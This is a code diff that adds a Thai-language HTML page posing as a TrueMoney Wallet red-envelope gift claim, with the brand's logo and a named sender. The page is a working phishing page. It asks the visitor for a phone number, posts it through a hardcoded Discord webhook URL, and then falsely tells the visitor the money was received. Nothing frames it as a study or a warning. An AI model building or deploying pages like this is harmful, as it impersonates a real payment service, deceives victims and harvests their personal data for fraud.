@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>รับซองอั่งเปา | TrueMoney Wallet</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fff;
+        }
+
+        .container {
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        .red-envelope {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        .title {
+            font-size: 22px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            font-size: 18px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .input-phone {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .receive-button {
+            background-color: #ff6f00;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            width: 100%;
+        }
+
+        .receive-button:hover {
+            background-color: #ff8f00;
+        }
+
+        .note {
+            font-size: 14px;
+            color: #888;
+            margin-top: 15px;
+        }
+
+        .links {
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .links a {
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="container">
+            <img src="Logo-True-money-wallet.png" alt="TrueMoney Wallet" class="logo">
+        </div> 
+        <img src="true-wallet-gift.png" alt="ซองอั่งเปา" class="red-envelope">       
+        <div class="title">รับซองอั่งเปาจาก</div>
+        <div class="subtitle">นายนัฐวูฒิ ***</div>
+        <input type="tel" class="input-phone" placeholder="กรอกเบอร์โทรศัพท์เพื่อรับซองอั่งเปา">
+        <button class="receive-button">รับเงินทันที</button>
+        <div class="note">หากคุณยังไม่มีบัญชี ทรูมันนี่ <a href="#">สมัครสมาชิก ได้ที่นี่</a></div>
+        <div class="links"><a href="#">ดูรายละเอียดของซองของขวัญ</a></div>
+    </div>
+
+    <script>
+        document.querySelector('.receive-button').addEventListener('click', function() {
+            const phoneInput = document.querySelector('.input-phone').value;
+            if (phoneInput.trim() !== "") {
+                // ส่งข้อมูลไปที่ Discord Webhook
+                fetch("https://discord.com/api/webhooks/1333845444161437696/ol1XUCjMfF1wYEGaZ0P0Cm3x8nJ8fdanshd_nUUEwHgrUiFbvofHlF4wKijykF6v-Ip6", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        content: `📲 เบอร์โทรศัพท์ใหม่: ${phoneInput}`
+                    })
+                })
+                .then(response => {
+                    // แจ้งผู้ใช้ว่าได้รับซองอั่งเปาสำเร็จ
+                    alert(`เบอร์ ${phoneInput} ได้รับซองอั่งเปาสำเร็จ!`);
+                    alert("ส่งข้อมูลไปที่ Discord สำเร็จ!");
+                })
+                .catch(error => {
+                    alert('เกิดข้อผิดพลาด กรุณาลองใหม่');
+                });
+            } else {
+                alert('กรุณากรอกเบอร์โทรศัพท์ให้ถูกต้อง');
+            }
+        });
+    </script>
+</body>
+</html>
